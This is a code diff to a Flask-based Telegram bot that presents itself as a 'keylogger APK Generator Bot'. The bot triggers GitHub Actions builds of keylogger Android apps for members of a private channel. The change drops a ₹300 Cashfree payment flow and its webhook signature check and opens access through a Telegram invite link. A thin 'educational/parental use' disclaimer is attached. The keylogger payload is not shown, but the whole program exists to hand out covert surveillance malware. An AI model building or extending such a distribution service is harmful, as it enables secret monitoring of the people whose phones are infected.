@@ -1,8 +1,5 @@
-# Updated Kidslogger Flask App with channel ID
 import os
 import logging
-import hmac
-import hashlib
 import requests
 from flask import Flask, request, render_template_string
 
@@ -15,11 +12,9 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 REPO_OWNER = os.getenv("REPO_OWNER")
 REPO_NAME = os.getenv("REPO_NAME")
 GITHUB_PAT = os.getenv("GITHUB_PAT")
-CASHFREE_APP_ID = os.getenv("CASHFREE_APP_ID")
-CASHFREE_SECRET_KEY = os.getenv("CASHFREE_SECRET_KEY")
-CHANNEL_ID = "-1002264821568"  # ✅ Your private channel ID
+CHANNEL_ID = "-1002264821568"  # Your private channel ID
 
-if not all([BOT_TOKEN, REPO_OWNER, REPO_NAME, GITHUB_PAT, CASHFREE_APP_ID, CASHFREE_SECRET_KEY]):
+if not all([BOT_TOKEN, REPO_OWNER, REPO_NAME, GITHUB_PAT]):
     raise ValueError("Missing one or more required environment variables.")
 
 @app.route("/", methods=["GET"])
@@ -41,9 +36,10 @@ def handle_message():
     if command == "/start":
         welcome = (
             "\U0001F44B Welcome to the keylogger APK Generator Bot!\n\n"
-            "Developed by <a href=\"https://www.instagram.com/cyber.naveen.info\">cyber.naveen.info</a>\n\n"
-            "\U0001F6E1 Disclaimer: This is for educational/parental use only.\n\n"
-            "Pay ₹300 at https://tellogs.koyeb.app and join the channel to use /request_apk."
+            "Made by <a href=\"https://www.instagram.com/cyber.naveen.info\">cyber.naveen.info</a>\n\n"
+            "\U0001F6E1 Disclaimer: For educational/parental use only.\n\n"
+            "Join our Telegram channel to use /request_apk:\n"
+            "<a href=\"https://t.me/+lnwNZG4bJnsxYTk9\">Join Channel</a>"
         )
         send_message(chat_id, welcome, "HTML")
 
@@ -55,7 +51,7 @@ def handle_message():
             else:
                 send_message(chat_id, "\u274C Error generating APK. Try again later.")
         else:
-            send_message(chat_id, "\u26D4 You must join our private channel to use this command.")
+            send_message(chat_id, "\u26D4 You must join our private channel to use this command.\n\n👉 Join here: https://t.me/+lnwNZG4bJnsxYTk9")
 
     else:
         send_message(chat_id, "\u2753 Unknown command. Use /start for help.")
@@ -97,47 +93,14 @@ def trigger_github_action(chat_id):
         app.logger.error(f"GitHub Trigger Exception: {e}")
         return None
 
-@app.route("/paid-success", methods=["GET"])
-def payment_success():
-    invite_url = generate_one_time_invite()
-    return f"<h3>✅ Payment Successful!</h3><p>Click below to join the private channel:</p><a href=\"{invite_url}\">Join Tellogs</a>"
-
-def generate_one_time_invite():
-    try:
-        resp = requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/exportChatInviteLink",
-            data={"chat_id": CHANNEL_ID}
-        )
-        data = resp.json()
-        return data.get("result")
-    except Exception as e:
-        app.logger.error(f"Invite generation failed: {e}")
-        return "https://t.me/Tellogs"  # fallback if generation fails
-
-@app.route("/cashfree-webhook", methods=["POST"])
-def cashfree_webhook():
-    raw_payload = request.data
-    signature = request.headers.get("x-webhook-signature")
-
-    if not verify_signature(CASHFREE_SECRET_KEY, raw_payload, signature):
-        return "Invalid signature", 400
-
-    try:
-        data = request.get_json()
-        app.logger.debug(f"Webhook data: {data}")
-
-        if data.get("event") == "PAYMENT_SUCCESS":
-            app.logger.info("Payment successful, user can now access APK request.")
-    except Exception as e:
-        app.logger.error(f"Webhook error: {e}")
-
-    return "OK", 200
-
-def verify_signature(secret, payload, received_sig):
-    expected_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
-    return hmac.compare_digest(expected_sig, received_sig)
+@app.route("/join", methods=["GET"])
+def join_page():
+    return '''
+        <h2>📱 Free Access Granted!</h2>
+        <p>Click below to join the private Telegram channel and use the bot:</p>
+        <a href="https://t.me/+lnwNZG4bJnsxYTk9" target="_blank" style="font-size:18px;">👉 Join Tellogs Channel</a>
+    '''
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, use_reloader=False)
-
